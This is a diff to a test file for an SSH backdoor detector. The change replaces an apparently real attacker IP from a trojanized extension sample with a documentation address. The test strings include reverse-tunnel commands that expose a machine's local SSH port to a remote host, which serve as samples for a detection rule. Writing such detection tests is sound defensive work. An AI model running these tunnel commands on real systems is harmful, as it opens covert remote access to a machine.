@@ -14,7 +14,7 @@ TUNNEL = re.compile(REVERSE_RE)
 
 def test_reverse_forward_syntax_matches_the_real_cases():
     # the trojanized Cursor Claude Code extension (2026-10-29)
-    assert TUNNEL.search("ssh -N -R '*:0:localhost:22' -o StrictHostKeyChecking=no tunnel@134.209.82.225")
+    assert TUNNEL.search("ssh -N -R '*:0:localhost:22' -o StrictHostKeyChecking=no tunnel@198.51.100.88")
     assert TUNNEL.search("autossh -M 0 -NR 2222:localhost:22 tunnel@1.2.3.4")
     # a laptop exposing a dev server (u1048gchatecmac2, Oct 2026)
     assert TUNNEL.search('ssh "-o ServerAliveInterval=30" -p 443 -R0:localhost:8765 a.pinggy.io')
@@ -58,8 +58,8 @@ def test_key_written_by_hand_on_a_server_is_medium_anything_else_high():
 
 def test_tunnel_to_a_public_ip_is_critical_known_tunnel_services_are_left_to_exfil():
     det = SshBackdoorDetector()
-    t = dict(Kind="reverse_tunnel", Writers=["sh"], Samples=["ssh -N -R *:0:localhost:22 tunnel@134.209.82.225"])
-    assert det.to_findings([_row(Dest="134.209.82.225", **t)])[0]["severity"] == "critical"
+    t = dict(Kind="reverse_tunnel", Writers=["sh"], Samples=["ssh -N -R *:0:localhost:22 tunnel@198.51.100.88"])
+    assert det.to_findings([_row(Dest="198.51.100.88", **t)])[0]["severity"] == "critical"
     assert det.to_findings([_row(Dest="10.2.3.4", **t)])[0]["severity"] == "high"
     assert det.to_findings([_row(Dest="jump.example.com", **t)])[0]["severity"] == "high"
     assert det.to_findings([_row(Dest="serveo.net", **t)]) == []
